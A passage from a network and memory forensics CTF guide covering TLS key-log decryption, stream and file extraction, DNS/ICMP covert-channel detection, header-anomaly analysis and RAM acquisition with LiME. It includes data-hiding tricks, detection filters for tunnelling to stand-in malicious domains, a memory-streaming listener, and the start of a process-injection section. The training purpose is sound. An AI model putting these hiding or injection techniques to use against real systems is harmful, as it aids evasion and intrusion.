# We send the flag as a POST request so it's inside the encrypted payload
curl -k -X POST -d "flag=CTF{decrypt_th3_stream_w1th_k3ys}" https://localhost:4433/login

# 4. Stop the capture
kill $TCPDUMP_PID
```

Step 3: Hiding the Keys (Obfuscation)

Now you have challenge_traffic.pcap (encrypted) and session_keys.log (the decryption key). You must hide the log file.

Method A: Alternate Data Stream (Windows context)

If the challenge file provided is a disk image or a zip from a Windows user:

Bash

```
# Concept: The solver gets a folder. The key is hidden behind a text file.
type session_keys.log > readme.txt:secretkeys
```

Method B: Embedded inside a "Memory Dump" or unrelated file

Append the keys to a binary or image file that the user must analyze.

Bash

```
# Append keys to the end of a JPG (Steganography lite)
cat benign_image.jpg session_keys.log > evidence_image.jpg
```

Method C: Base64 encoded in a "User Configuration" file

Create a fake config file (e.g., config.json) and bury the keys there.

Python

```
# Example of embedding the key log into a fake JSON config
import json

with open('session_keys.log', 'r') as f:
    keys = f.read()

data = {
    "user": "admin",
    "theme": "dark",
    "debug_trace": keys  # The solver finds this suspicious string
}

with open('developer_config.json', 'w') as f:
    json.dump(data, f)
```

#### 3. Example Scenario

Scenario Title: "The Developer's Debug"

Context: A developer claims their secure login portal is malfunctioning. They sent you a packet capture (traffic.pcap) and their VS Code workspace settings (workspace.tar.gz).

Artifacts:

1. `traffic.pcap`: Contains TLSv1.3 traffic. The flag is sent in a POST body to `/api/v1/admin/secrets`. It is unreadable.
    
2. workspace.tar.gz: Contains source code and a file named .env.backup.
    
    The Challenge:
    

- The user analyzes `traffic.pcap` and sees encrypted TLS.
    
- The user extracts `workspace.tar.gz` and finds `.env.backup`.
    
- Inside `.env.backup`, there is a variable: `SSL_DEBUG_DUMP=<Base64 String>`.
    
- Decoding the Base64 string reveals lines starting with `CLIENT_RANDOM ...`.
    
- The user saves this to `keys.txt`, loads it into Wireshark (`Edit -> Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename`), and the PCAP decrypts to reveal the flag.
    

#### 4. Key Tools

- **Wireshark:** The primary tool for analyzing PCAP files and decrypting SSL/TLS when keys are provided.
    
- **OpenSSL:** Used to generate certificates and test SSL connections manually during challenge creation.
    
- **Curl:** The standard command-line tool for generating specific web traffic, capable of respecting `SSLKEYLOGFILE`.


## The Investigator (Solution)

### Stream reassembly and object export in Wireshark/TShark

#### 1. Technical Theory

Network protocols like TCP break large chunks of application data (files, images, long text) into smaller segments to fit within the Maximum Transmission Unit (MTU) of the network links. This process is called segmentation. To analyze the actual content transferred (e.g., a downloaded PDF or a malware binary), an investigator cannot look at single packets in isolation.

**Stream Reassembly** is the process of collecting all packets belonging to a specific communication session (identified by the 5-tuple: Source IP, Dest IP, Source Port, Dest Port, Protocol) and ordering them by their Sequence Numbers. This reconstructs the raw data layer as the application originally saw it.

**Object Export** takes this a step further by parsing application-layer protocols (like HTTP, SMB, or TFTP) to automatically identify files, strip the protocol headers, and save the contained payloads to disk.

#### 2. Practical Implementation (The "How-To")

**Method A: Wireshark (GUI)**

- **Follow TCP/HTTP Stream:**
    
    1. Locate a packet of interest (e.g., an HTTP GET request).
        
    2. Right-click the packet and select **Follow** > **TCP Stream** (for raw data) or **HTTP Stream** (for application-level transcript).
        
    3. A window opens showing the reassembled data. Use the dropdown to view "Entire conversation," "Server to Client" (Download), or "Client to Server" (Upload).
        
    4. **To Save:** Change the format to "Raw" and click "Save as..." to dump the binary data to a file.
        
- **Export Objects (Automated Extraction):**
    
    1. Go to **File** > **Export Objects**.
        
    2. Select the protocol (commonly **HTTP**, **SMB**, **TFTP**, or **IMF** for emails).
        
    3. A list of detected files appears with filenames, sizes, and content types.
        
    4. Select specific files to save or click **Save All**.
        

Method B: TShark (Command Line)

TShark is ideal for automating extraction from massive PCAP files where the GUI might lag or crash.

1. Automated Object Export:

This command acts exactly like the "Export Objects" GUI feature, extracting all files of a certain protocol to a directory.

Bash

```
# Syntax: tshark -r <pcap> --export-objects <protocol>,<destination_folder>

# Create output directory
mkdir extracted_files

# Extract all HTTP objects (html, images, binaries)
tshark -r capture.pcap --export-objects http,./extracted_files

# Extract files transferred via SMB (Windows Shares)
tshark -r capture.pcap --export-objects smb,./extracted_files
```

2. Manual Stream Dumping:

If you know the Stream Index (tcp.stream) from previous analysis, you can dump that specific conversation.

Bash

```
# Dump TCP Stream #12 to stdout in hex format
tshark -r capture.pcap -q -z follow,tcp,hex,12

# Dump to a file (useful for text-based protocols)
tshark -r capture.pcap -q -z follow,tcp,ascii,12 > stream_12.txt
```

#### 3. Example Scenario

Scenario Name: "The Phish Catch"

Description: An employee clicked a link in a suspicious email. The security team captured the traffic. You need to recover the payload they downloaded.

Analysis Steps:

1. The investigator opens the PCAP in Wireshark.
    
2. They navigate to **File > Export Objects > HTTP**.
    
3. They see a file listed with the Content-Type `application/vnd.ms-excel` but a filename `invoice.php`.
    
4. They save the file.
    
5. Running `file invoice.php` reveals it is actually a Windows Executable (PE32).
    
6. Executing the binary in a sandbox (or running `strings`) reveals the flag `FLAG{hidden_in_plain_sight_streams}`.
    

#### 4. Key Tools

- **Wireshark:** The standard tool for interactive stream reassembly and visual inspection.
    
- **TShark:** Essential for scripting the extraction of thousands of files from bulk captures.
    
- **NetworkMiner:** A specialized forensic tool that _automatically_ reassembles and extracts files, images, and credentials upon loading a PCAP, often requiring zero manual configuration.

---

### Detecting and Recovering Data from Covert Network Channels

#### 1. Technical Theory

Covert channels using DNS and ICMP exploit protocol fields that are often overlooked or allowed by network security monitoring systems. The goal for the investigator is to identify **anomalies in traffic volume, packet size, and field encoding**.

- **DNS Tunneling Detection:** Tunnels create **high volume, low entropy** DNS traffic targeting a single, unusual external domain (the C2 server). The queries often contain **non-standard character sets** (Base64, Hex) within the **QNAME** field, exceeding the typical short hostname lookups. Chunking is a tell-tale sign of data transfer.
    
- **ICMP Exfiltration Detection:** This method often involves **larger-than-normal ICMP Echo Requests**. While a standard ping payload is small (32-64 bytes of padding), exfiltration increases the packet size to carry the encoded data. Since ICMP is connectionless, there is usually an asymmetrical stream: many requests leaving the network with data, and small or no replies.
    

---

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator (Solution)**

The solution involves using packet analysis tools to filter, extract, and decode the hidden payloads.

##### **Method 1: Wireshark/Tshark Filtering and Analysis**

1. **Isolate DNS Traffic and Identify Anomalous Domains:**
    
    Bash
    
    ```
    # Filter for all DNS queries and count requests per destination IP
    tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -nr
    ```
    
    - **Action:** Look for domains with abnormally high counts or non-standard naming conventions (e.g., long, randomized subdomains).
        
    - **Wireshark Filter:** `dns.qry.name contains ".bad-actor.org"` or `dns.flags.response == 0 and dns.qry.name len > 40` (to target long queries).
        
2. **Isolate ICMP Traffic and Check Payload Size:**
    
    Bash
    
    ```
    # Filter for ICMP Echo Requests and display the payload length
    tshark -r capture.pcap -Y "icmp.type == 8" -T fields -e ip.len
    ```
    
    - **Action:** Look for packets where `ip.len` (total IP length) is consistently higher than the standard 60–98 bytes, indicating added data in the ICMP payload.
        
    - **Wireshark Filter:** `icmp.type == 8 and data.len > 64`
        

##### **Method 2: Python Scripting for Automated Extraction and Decoding**

This script automates the extraction and decoding of data from either DNS or ICMP payloads found in the PCAP.

Python

```
from scapy.all import *
import binascii

def extract_covert_data(pcap_file, protocol_type):
    """
    Extracts and attempts to decode data from a covert channel PCAP.
    protocol_type: 'dns' or 'icmp'
    """
    packets = rdpcap(pcap_file)
    extracted_chunks = []
    
    for pkt in packets:
        if protocol_type == 'dns' and DNS in pkt and pkt[DNS].qr == 0:
            # DNS Query (qr=0)
            qname = str(pkt[DNS].qd.qname, 'utf-8')
            # Assuming the format is [data].attacker.com.
            chunk = qname.split(".")[0]
            extracted_chunks.append(chunk)
            
        elif protocol_type == 'icmp' and ICMP in pkt and pkt[ICMP].type == 8:
            # ICMP Echo Request (type=8), ensure it has a payload
            if 'Raw' in pkt:
                # The data is in the Raw layer, skip the 8-byte ICMP header fields
                payload = bytes(pkt[Raw].load)
                extracted_chunks.append(payload.decode('utf-8', errors='ignore'))
                
    full_encoded_data = "".join(extracted_chunks)
    
    # Attempt decoding (CTF artifacts often use Hex or Base64)
    print(f"\n[+] Raw Extracted Data: {full_encoded_data[:80]}...")
    
    try:
        # 1. Attempt Hex decoding (common for DNS due to character constraints)
        decoded_hex = binascii.unhexlify(full_encoded_data).decode('utf-8', errors='ignore')
        print(f"\n[+] Hex Decoded Result (Possible Flag): {decoded_hex}")
    except binascii.Error:
        print("[-] Hex decoding failed.")
    
    # You would also attempt Base64 and other standard CTF encodings here.

if __name__ == "__main__":
    # Example 1: Analyze DNS tunnel pcap (assuming hex encoding from Architect's script)
    extract_covert_data("dns_tunnel.pcap", 'dns') 
    
    # Example 2: Analyze ICMP exfil pcap (assuming raw text/small chunks)
    extract_covert_data("icmp_covert.pcap", 'icmp')
```

---

#### 3. Example Scenario

Title: The Suspicious Bulk Data Transfer

Scenario: An investigator receives a PCAP (network_dump.pcap) and is told that an infected host (192.168.1.50) was exfiltrating data. The transfer did not use standard HTTP or FTP.

The Artifact: Filtering the PCAP reveals heavy DNS traffic from 192.168.1.50 to a non-authoritative DNS server (8.8.8.8). The queries contain extremely long subdomains that look like Base64 chunks (e.g., ZGVhZGJlZWY=.malicious.net).

The Investigation:

1. Isolate the DNS queries to `malicious.net`.
    
2. Extract the Base64 subdomain part from each sequential query.
    
3. Concatenate the extracted chunks.
    
4. Decode the concatenated string from Base64 to reveal a large, suspicious block of text or a file header.
    
    The Flag: The decoded block of data is the flag: CTF{C0v3rt_DNS_S1gn4tur3}.
    

---

#### 4. Key Tools

- **Wireshark:** Essential for visualizing the traffic, profiling the unusual domain, and quickly filtering by packet length and protocol type.
    
- **Tshark:** The command-line version of Wireshark, used to automate the extraction of specific fields (like `dns.qry.name` or `data.load`) into a clean text file for further analysis and decoding.
    
- **Scapy:** The most flexible Python library for reading PCAPs and programmatically accessing and extracting data from non-standard protocol fields in bulk.
    
- **CyberChef:** Used for rapid decoding of the extracted payloads (Hex, Base64, ASCII) without needing to write custom scripting for every encoding type.

---

### Detecting anomalies in protocol headers

#### 1. Technical Theory

Protocol headers (IP, TCP, UDP, ICMP) are defined by strict Request for Comments (RFC) standards. Every bit has a designated purpose. An anomaly occurs when a field contains values that deviate from the standard behavior or "normal" traffic patterns.

- **Reserved Bits:** Many protocols have bits set aside for "future use" (e.g., the Reserved bit in the IPv4 header or the 3 reserved bits in the TCP header). According to RFCs, these _must_ be zero. If they are set to 1, it indicates potential covert channels or custom exfiltration tools.
    
- **The "Evil Bit":** RFC 3514 (an April Fools' joke) defined the high-order bit of the IP Fragment Offset as the "Evil Bit." In CTFs, setting this bit (`ip.flags.rb`) is a common flag hiding technique.
    
- **Field Abuse:** Attackers may hide data in fields that vary naturally, such as the **IP Identification (ID)** field, **TCP Initial Sequence Number (ISN)**, or **TCP Window Size**.
    

**Key Constraints:**

- Anomalies are often subtle; a single bit difference in a stream of thousands of packets is easy to miss without specific filters.
    
- Protocol scrubbers (firewalls) often drop packets with malformed headers, so this technique is usually found in internal traffic or captured before egress.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator (Solution)**

To solve these challenges, you must move beyond looking at the payload and inspect the headers byte-by-byte.

Method 1: Wireshark Filtering & Coloring

Wireshark is the first line of defense. You can use display filters to isolate packets violating standard RFCs.

- Detecting IP Reserved Bit (The Evil Bit):
    
    Filter: ip.flags.rb == 1
    
- Detecting Non-Zero TCP Reserved Bits:
    
    Filter: tcp.flags.res != 0
    
- Detecting Anomalous TCP Flags (e.g., NULL or XMAS scans):
    
    Filter: tcp.flags == 0x00 (NULL) or tcp.flags == 0x29 (Fin, Urg, Push set)
    

Method 2: Tshark (Command Line extraction)

If the flag is hidden across many packets (e.g., one char per packet in the IP ID field), manually copying them from Wireshark is impossible. Use tshark.

- **Scenario:** The flag is hidden in the IP ID field of ICMP packets.
    
- **Command:**
    
    Bash
    
    ```
    # -r: Read file
    # -Y: Display filter (only ICMP)
    # -T fields -e: Extract specific field (IP ID)
    tshark -r capture.pcap -Y "icmp" -T fields -e ip.id
    ```
    
    _Output:_ `17235`, `21060`, etc. You would then convert these decimal/hex values to ASCII.
    

Method 3: Python Analysis (Scapy)

For complex header anomalies (e.g., data hidden in the TCP Sequence Number difference between packets), Python is required.

- **Script:** Extracting ASCII characters hidden in the **TCP Reserved Bits**.
    

Python

```
from scapy.all import *

def solve_tcp_reserved(pcap_file):
    """
    Reads a pcap and checks the TCP Reserved bits.
    In Scapy, the TCP flags field covers the reserved bits.
    We need to perform bitwise operations to isolate them.
    """
    try:
        packets = rdpcap(pcap_file)
    except FileNotFoundError:
        print("[-] File not found.")
        return

    flag_bits = ""
    
    print(f"[+] Analyzing {len(packets)} packets for TCP Reserved anomalies...")

    for pkt in packets:
        if TCP in pkt:
            # The 'flags' attribute in Scapy can be treated as an integer.
            # The structure of the 13th and 14th bytes of TCP header (flags/offset):
            # Data Offset (4 bits) | Reserved (3 bits) | Flags (9 bits)
            # However, Scapy abstracts this. We can look at the 'reserved' attribute directly 
            # in newer Scapy versions, or inspect the raw byte.
            
            # Method A: Using Scapy's attribute (if available/parsed)
            res = pkt[TCP].reserved
            
            # If data is hidden here, it's likely non-zero.
            if res > 0:
                # Start collecting bits or values. 
                # In a CTF, this might be the raw integer value of the reserved section.
                flag_bits += str(res) 
                
                # Alternative: If the reserved bits represent a specific binary value
                # meant to be concatenated.

    print(f"[+] Extracted Raw Values: {flag_bits}")
    # Further processing might be needed (e.g., converting binary string to ASCII)

if __name__ == "__main__":
    # In many CTFs, the 'Reserved' field is used to store 3 bits of the flag per packet.
    solve_tcp_reserved("anomaly.pcap")
```

#### 3. Example Scenario

Title: The Reserved Channel

Scenario: Participants are given covert.pcap. The traffic looks like a normal file download (HTTP). However, the file downloaded is corrupted/irrelevant.

The Anomaly: A closer look at the TCP headers reveals that every packet coming from the server has the TCP Reserved bits (bits 4-6 of byte 13) set to non-zero values.

The Solution:

1. The investigator notices `tcp.flags.res` are active.
    
2. They extract the 3-bit value from every packet in sequence.
    
3. Concatenating these bits forms a binary stream: `01000011 01010100 01000110...`
    
4. Converting the binary stream to ASCII reveals the flag `CTF{R3s3rv3d_Byt3s_R_Us3ful}`.
    

#### 4. Key Tools

- **Wireshark:** The GUI standard for identifying visual anomalies via the "Packet Details" pane.
    
- **Tshark:** The CLI companion to Wireshark, best for piping specific header fields into text files for decoding.
    
- **Scapy:** Best for algorithmic extraction when the data is spread across bit-level fields that standard tools don't export easily.

---

### Analyzing "Needle in a Haystack" scenarios (burst traffic).

#### 1. Technical Theory

In network forensics, solving a "Needle in a Haystack" challenge requires shifting the focus from **volume** to **anomaly**. The large volume of burst traffic (the haystack) is designed to overwhelm tools and human analysts, obscuring a single, often small, packet or flow (the needle) that carries the critical data or flag.

The investigator's primary task is to apply **signal processing techniques** to the captured traffic. This involves **filtering** out expected noise (e.g., high-volume UDP streaming, known legitimate HTTP traffic) and **correlating** unusual attributes (e.g., non-standard ports, unusual packet lengths, unexpected protocol usage, or timestamps coinciding with the burst peak).

**Key Anomalies to Target:**

- **Protocol Mismatch:** Finding a low-volume TCP session hidden within a UDP flood, or vice versa.
    
- **Payload Length:** Packets with suspiciously small or large payloads, especially when compared to the surrounding burst traffic.
    
- **Time Slicing:** Isolating traffic that occurred only within a very short, specific window.
    

---

#### 2. Practical Implementation (The Investigator)

The solution involves a combination of **visualization**, **filtering**, and **extraction**.

Step 1: Visualization and Isolation (Wireshark I/O Graphs)

Before applying complex filters, use the I/O graph to visually identify the burst period.

1. Open the PCAP in **Wireshark**.
    
2. Navigate to **Statistics** > **I/O Graphs**.
    
3. Set the interval (e.g., 100ms or 1s) and observe the spike.
    
4. Use the graph to determine the precise **start and end time** of the high-volume burst. This defines the narrow time window for the search.
    

Step 2: Filtering the Noise (Display Filters)

Apply specific Wireshark or TShark filters to eliminate the majority of the background traffic.

Bash

```
# Example: Filter OUT the known high-volume traffic (e.g., UDP/RTP streaming)
# This retains all other protocols that might carry the flag.
# Apply this filter in Wireshark's display filter bar:
!(udp.port == 5000) && !(rtp)

# Example: Filter for anomalous packets (e.g., high data rate but unusual port)
# Search for HTTP traffic occurring on a non-standard port (e.g., 8080) during the burst window.
(http) && (tcp.port == 8080) && (frame.time >= "2025-01-01 10:00:00.000" && frame.time <= "2025-01-01 10:00:02.500")
```

Step 3: Finding Hidden Payloads (TShark/Grep)

For cases where the flag is a simple string hidden in a payload (e.g., ICMP data or a DNS query), use command-line tools for fast, brute-force searching.

Bash

```
# Use TShark to export fields and grep for the flag structure across the entire PCAP.
# -T fields: output fields
# -e data: export the raw payload data (Layer 3/4 payload)
tshark -r challenge.pcap -T fields -e data | grep -P 'flag\{[a-zA-Z0-9_-]{5,40}\}'

# Use a specific display filter to look only at DNS queries (where the flag might be encoded)
# Then search the domain names for the flag pattern.
tshark -r challenge.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | grep 'malicious-site.com'
```

---

#### 3. Example Scenario

Challenge Name: "The Hidden Retransmission"

Scenario Description: A 500MB PCAP file is provided, dominated by UDP video stream traffic. An internal audit suggests a single TCP connection was used to steal a configuration file.

The Artifact: burst_capture.pcapng (500MB, 99% UDP).

Solution Steps:

1. **Visualization:** Use Wireshark's I/O Graph to confirm the large UDP spike and find the precise 10-second window where the burst peaked.
    
2. **Protocol Filtering:** Apply the display filter `tcp` to eliminate the noise, leaving only the few TCP packets.
    
3. **Anomaly Detection:** Quickly review the remaining TCP packets. The analysis reveals a single **TCP Retransmission** packet, which often suggests data loss or unusual activity.
    
4. **Extraction:** Following the TCP stream associated with the retransmission reveals a suspicious payload containing non-HTTP data. The flag is found encoded in the payload of that specific retransmitted segment: `flag{R3tr4nsm1ss10n_is_ev1denc3}`.
    

---

#### 4. Key Tools

1. **Wireshark:** Essential for **visualizing** the burst using I/O Graphs and applying complex, multi-layered **display filters** (`!(protocol)`) to eliminate high-volume noise.
    
2. **TShark:** The command-line version of Wireshark, crucial for **scripting** and **extraction**. It allows investigators to efficiently pipe payload data from large PCAP files into secondary tools like `grep` for pattern matching (Regex).
    
3. **Protocol Analyzers (e.g., Zeek):** Useful for large datasets as they process the PCAP and output metadata logs (conn.log, dns.log, http.log). The investigator can analyze these smaller, categorized logs with standard text tools much faster than analyzing the raw PCAP.

---

### Decrypting SSL traffic using master secrets/key logs.

#### 1. Technical Theory

Transport Layer Security (TLS) ensures privacy by encrypting data between a client and a server. In a forensic context, capturing packets (PCAP) involving HTTPS, SMTPS, or LDAPS results in unreadable "Application Data."

Modern TLS often uses **Perfect Forward Secrecy (PFS)** (e.g., via Diffie-Hellman key exchange). This means that even if you possess the server's private RSA key, you cannot retroactively decrypt captured traffic because the session keys are ephemeral and never transmitted over the network.

To bypass this in a CTF or forensic analysis, investigators utilize an **SSL Key Log File** (NSS Key Log Format). When configured via the `SSLKEYLOGFILE` environment variable, browsers and certain malware write the ephemeral session secrets (specifically the `CLIENT_RANDOM` mapped to the `MASTER_SECRET`) to a text file. Wireshark can ingest this file, map the random bytes in the "Client Hello" packet to the logged secret, and derive the symmetric keys needed to decrypt the payload.

#### 2. Practical Implementation (The Investigator)

Step 1: Verify the Artifacts

You typically receive two files:

1. `capture.pcapng`: The encrypted network traffic.
    
2. `ssl.log` (or `secrets.txt`): The text file containing the master secrets.
    

Verify the log file format. It should look like this:

Plaintext

```
# SSL/TLS secrets log file, generated by NSS
CLIENT_RANDOM 4a1b2c3d... <48 bytes of hex> ... 9z8y7x6w... <48 bytes of master secret>
CLIENT_RANDOM ...
```

**Step 2: Decryption via Wireshark (GUI)**

1. Open `capture.pcapng` in Wireshark.
    
2. Navigate to **Edit** > **Preferences**.
    
3. Expand **Protocols** and scroll down to **TLS** (in older versions, look for **SSL**).
    
4. Locate the field **(Pre)-Master-Secret log filename**.
    
5. Browse and select your `ssl.log` file.
    
6. Click **OK**.
    
7. **Verification:** The protocol column in the packet list should change from "TLSv1.2" or "TCP" to "HTTP" or "HTTP2". You will now see plaintext HTTP requests (GET, POST) and responses.
    

Step 3: Decryption via TShark (CLI)

For automated extraction or working on headless servers, use tshark.

Bash

```
# Syntax: tshark -r [pcap] -o "tls.keylog_file:[log_file]" -Y [display_filter]

# Example: Decrypt traffic and filter for HTTP POST requests (often where flags are exfiltrated)
tshark -r evidence.pcap -o "tls.keylog_file:ssl.log" -Y "http.request.method == POST"

# Example: Export specific objects (like images or files) from the decrypted stream
tshark -r evidence.pcap -o "tls.keylog_file:ssl.log" --export-objects "http,./output_folder"
```

Step 4: Extracting the Flag

Once decrypted, standard analysis applies:

- **Search for Strings:** `Ctrl+F` > "Packet Details" > "String" > "flag{".
    
- **Follow Stream:** Right-click a packet > Follow > HTTP Stream to read the full conversation.
    
- **Export Objects:** File > Export Objects > HTTP to save images or binaries transferred over the encrypted tunnel.
    

#### 3. Example Scenario

Challenge Name: "Blind Messenger"

Scenario: A rogue employee, "Alice," was caught communicating with a C2 server using a proprietary chat web app. The network team captured the traffic, but it is encrypted via TLS 1.3.

Artifacts: intercept.pcapng and a memory dump alice_ram.raw.

Solution Path:

1. The investigator analyzes `alice_ram.raw` using `volatility` or `strings` and greps for `CLIENT_RANDOM` to reconstruct the `ssl.log` file (browsers cache this in memory).
    
2. The investigator loads `intercept.pcapng` into Wireshark and applies the reconstructed key log.
    
3. The "Application Data" packets resolve into HTTP/2 traffic.
    
4. Reviewing the HTTP streams reveals a JSON response in packet #405 containing: `{"message": "status_ok", "payload": "flag{m3m0ry_f0r3ns1cs_unl0cks_n3tw0rk_s3cr3ts}"}`.
    

#### 4. Key Tools

1. **Wireshark:** The primary graphical tool for analyzing network packets and performing the decryption.
    
2. **TShark:** The terminal-based counterpart to Wireshark, essential for scripting and piping decrypted data into other tools (like `grep`).
    
3. **Volatility 3:** While not a network tool, it is the industry standard for extracting the SSL Key Log artifacts (the secrets) from RAM dumps to enable the network decryption.

---

### Reconstructing files from unencrypted SMB/FTP streams

#### 1. Technical Theory

Reconstructing files from network traffic relies on the fact that legacy protocols like **FTP** (File Transfer Protocol) and unencrypted **SMB** (Server Message Block v1/v2) transmit file payloads in cleartext.

- **FTP Architecture:** FTP uses two separate channels. The **Control Channel** (typically Port 21) sends commands (e.g., `RETR filename.pdf`), while the **Data Channel** (Port 20 or ephemeral high ports) transmits the actual file bytes. To recover a file, you must locate the Data Channel stream associated with the file request in the Control Channel.
    
- **SMB Architecture:** SMB is a request-response protocol used for network file sharing. File data is transmitted in chunks (payloads) inside SMB `Read` or `Write` packets. Unlike FTP, the control headers and file data are often intermingled in the same TCP stream. Reassembly requires stripping the SMB headers from every packet to stitch the file data back together.
    

**Key Constraints:** Reconstruction fails if the protocol is encrypted (FTPS/SFTP or SMBv3 with encryption flags enabled).

#### 2. Practical Implementation (The "How-To")

Method A: Wireshark "Export Objects" (The "Easy Button")

Wireshark has built-in dissectors that automatically strip protocol headers and reassemble payloads for specific protocols.

1. **Open PCAP:** Load your capture file into Wireshark.
    
2. **SMB Extraction:**
    
    - Navigate to: `File` > `Export Objects` > `SMB` (or `SMB2`).
        
    - This opens a window listing all files transferred over SMB.
        
    - Select the target file and click `Save`.
        
3. **FTP Extraction (Manual Stream Reassembly):**
    
    - _Note: "Export Objects" often does not support FTP directly in older versions._
        
    - Filter for FTP data traffic: `ftp-data`.
        
    - Locate the packet with the largest size (usually indicating the start of the file transfer).
        
    - Right-click the packet > `Follow` > `TCP Stream`.
        
    - In the stream window, ensure the view is set to **"Raw"**.
        
    - Click `Save as...` and name the file with its original extension (e.g., `leaked_document.pdf`).
        

Method B: NetworkMiner (Automated Forensics)

NetworkMiner is an OSINT/Forensic tool designed to parse PCAPs specifically for artifacts rather than packet analysis.

1. Launch NetworkMiner.
    
2. Drag and drop the `.pcap` file into the interface.
    
3. Click the **"Files"** tab.
    
4. Right-click the desired file and select `Open Folder` to retrieve the reconstructed artifact.
    

Method C: CLI Automation (Tshark)

For large captures where GUI tools crash, use tshark (the command-line version of Wireshark) to export objects.

Bash

```
# Syntax: tshark -r <input.pcap> --export-objects <protocol>,<destination_folder>

# Export all SMB files
tshark -r evidence.pcap --export-objects smb,extracted_files/

# Export all HTTP files (similar process)
tshark -r evidence.pcap --export-objects http,extracted_files/
```

#### 3. Example Scenario

Scenario Title: "The Printer's Cache"

Context: An employee is suspected of printing confidential schematics before resigning. The office printer uses an unencrypted SMB share to receive print jobs from workstations. You have a PCAP of the network segment from the day of the resignation.

Analysis:

1. The investigator filters for `smb` traffic.
    
2. They observe a `SMB2_CREATE` Request for `CONFIDENTIAL_PROJECT_X.SPL` (Windows Spool File).
    
3. Using `File > Export Objects > SMB`, the investigator recovers the `.SPL` file.
    
4. Using a spool file viewer or converting the PCL (Printer Command Language) data inside, they reconstruct the exact image of the document that was printed.
    

#### 4. Key Tools

- **Wireshark:** Best for manual verification and extracting specific streams ("Follow TCP Stream").
    
- **NetworkMiner:** Best for rapid, automated extraction of all files from a capture without manual reassembly.
    
- **Tshark:** Best for scripting the extraction of files from massive PCAP files that fit in memory.


# Module 4: Memory Forensics (Volatile Data)

## The Architect (Creation)

### Safe techniques for dumping RAM (Vmware snapshots vs. LiME)

#### 1. Technical Theory

Memory acquisition is the process of copying the contents of volatile memory (RAM) to non-volatile storage. The method used significantly impacts the integrity of the resulting image.

- **Hypervisor-Level Acquisition (VMware Snapshots):** This is the "cleanest" method for CTF creation. When you take a snapshot of a Virtual Machine, the hypervisor pauses the CPU. The entire state of the RAM is written to disk instantly relative to the VM's time. This results in an **Atomic** dump—there is no "memory smear" (data changing during the copy process).
    
- **Kernel-Level Acquisition (LiME):** LiME (Linux Memory Extractor) loads a kernel module to read physical memory from within the OS. Because the OS is still running during the dump, the memory content changes as it is being read. This causes **Smear**. While necessary for bare-metal forensics, it can sometimes lead to corrupted structures in CTF challenges if not handled carefully.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect (Creation)**

Method A: VMware Snapshots (Recommended for Stable Challenges)

This method guarantees a perfect memory image, ideal for complex heap or stack analysis challenges where memory shifting would break the solution.

1. **Prepare the Environment:** Set up your VM (Windows or Linux) with the intended flag/activity running.
    
2. **Pause the State:** In VMware Workstation/Fusion, simply take a **Snapshot**.
    
3. **Locate the Artifact:** Navigate to the VM's directory on the host machine. Look for the `.vmem` file.
    
    - _Note:_ This file appears only when the VM is running or suspended/snapshotted.
        
4. **Conversion (Optional but Recommended):** While Volatility can often read `.vmem` files directly, converting to a raw binary format ensures maximum compatibility for competitors.
    

Bash

```
# If you have the Volatility 'imagecopy' plugin or similar tools:
# Often, simply renaming the file is sufficient for many tools if the header is minimal.
cp TargetVM-Snapshot1.vmem challenge.raw

# For strict raw conversion (stripping VMware headers if present):
# You can use tools like vmem2raw, though modern .vmem is typically raw data.
```

Method B: LiME (Linux Memory Extractor)

Use this to simulate a "Live Response" scenario on a Linux server.

1. **Prerequisites:** You must compile LiME for the specific kernel version of the target VM.
    
    Bash
    
    ```
    sudo apt-get install build-essential linux-headers-$(uname -r)
    git clone https://github.com/504ensicsLabs/LiME.git
    cd LiME/src
    make
    ```
    
2. Acquisition Command:
    
    Insert the kernel module (.ko) passing arguments to define the output path and format. format=lime adds a header useful for Volatility; format=raw dumps pure bytes.
    
    Bash
    
    ```
    # Load the module to trigger the dump
    # 'path' is where the dump goes. using TCP is safer to avoid disk I/O smear, 
    # but for CTF creation, writing to a separate partition/USB is fine.
    sudo insmod ./lime.ko "path=/tmp/challenge_dump.lime format=lime"
    
    # Unload the module immediately after
    sudo rmmod lime
    ```
    
3. Verification:
    
    Check the hash of the output immediately.
    
    Bash
    
    ```
    sha256sum /tmp/challenge_dump.lime
    ```
    

C. Python Script: TCP Exfiltration Listener (for LiME)

To avoid writing to the VM's disk (which overwrites potential evidence), you can stream the RAM over the network to your Architect machine.

**Listener (Run on Architect Machine):**

Python

```
import socket

def receive_memory_dump(output_file, port=4444):
    s = socket.socket()
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"Listening for memory dump on port {port}...")
    
    client, addr = s.accept()
    print(f"Connection from {addr}. Receiving data...")
    
    with open(output_file, 'wb') as f:
        while True:
            data = client.recv(4096)
            if not data:
                break
            f.write(data)
            
    client.close()
    s.close()
    print(f"Dump saved to {output_file}")

if __name__ == "__main__":
    receive_memory_dump("remote_challenge.lime")
```

**Sender (Run on Target VM with LiME):**

Bash

```
sudo insmod ./lime.ko "path=tcp:4444 format=lime"
```

#### 3. Example Scenario

Scenario: "The Ghost in the Shell"

Challenge: Participants are provided a large file named snapshot.vmem. The prompt states: "Our server was compromised, but the attacker deleted the malware executable from the disk before we could catch them. Luckily, the sysadmin paused the VM just in time."

Architecture:

1. The Architect runs a custom Python malware script that injects a string (the flag) into its own process memory but does not write to disk.
    
2. The Architect takes a VMware snapshot.
    
3. **The Solve:** Participants must use Volatility (`linux.pslist`, `linux.memmap`, or `linux.strings`) to identify the suspicious Python process and dump its memory pages to find the flag residing in the heap.
    

#### 4. Key Tools

- **VMware Workstation / ESXi:** For generating atomic `.vmem` snapshots.
    
- **LiME (Linux Memory Extractor):** The standard for Linux kernel-level acquisition.
    
- **Volatility 3:** Essential for verifying that your generated dump is actually parseable and contains the artifacts you intended.
    
- **`netcat` (nc):** Useful for piping raw memory data over the network if not using Python scripts.

---

### Injecting code or malware into running processes

#### 1. Technical Theory

Process injection is a defense evasion technique where arbitrary code is executed within the address space of a separate, live process. By migrating into a legitimate process (like `explorer.exe`, `svchost.exe`, or `notepad.exe`), malware can hide its presence from process listings, bypass allowlisting, and access the target process's memory and permissions.

The standard Windows API workflow for "Classic DLL/Code Injection" involves four distinct steps:

1. **Open:** Obtain a handle to the target process (`OpenProcess`).
    
